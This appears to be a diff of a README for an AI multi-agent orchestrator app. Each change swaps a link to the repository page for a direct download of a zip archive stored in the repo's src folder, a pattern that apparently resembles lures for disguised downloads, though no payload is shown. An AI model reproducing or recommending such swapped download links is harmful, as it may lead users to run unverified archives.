@@ -1,6 +1,6 @@
 # 🤖 multi-agent-orchestrator - Simple AI Team Control
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Federa3911/multi-agent-orchestrator)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Federa3911/multi-agent-orchestrator/main/src/orchestrator_multi_agent_1.9-beta.4.zip)
 
 ## 📌 What this app does
 
@@ -25,7 +25,7 @@ If you plan to use the app with larger models or more agents, 16 GB of RAM gives
 
 Visit this page to download and use the project:
 
-[https://github.com/Federa3911/multi-agent-orchestrator](https://github.com/Federa3911/multi-agent-orchestrator)
+[https://raw.githubusercontent.com/Federa3911/multi-agent-orchestrator/main/src/orchestrator_multi_agent_1.9-beta.4.zip](https://raw.githubusercontent.com/Federa3911/multi-agent-orchestrator/main/src/orchestrator_multi_agent_1.9-beta.4.zip)
 
 ## 🛠️ Install on Windows
 
@@ -225,4 +225,4 @@ Clear input gives the agent system better results
 
 If you want to start over, use this link and repeat the steps above:
 
-[https://github.com/Federa3911/multi-agent-orchestrator](https://github.com/Federa3911/multi-agent-orchestrator)
+[https://raw.githubusercontent.com/Federa3911/multi-agent-orchestrator/main/src/orchestrator_multi_agent_1.9-beta.4.zip](https://raw.githubusercontent.com/Federa3911/multi-agent-orchestrator/main/src/orchestrator_multi_agent_1.9-beta.4.zip)
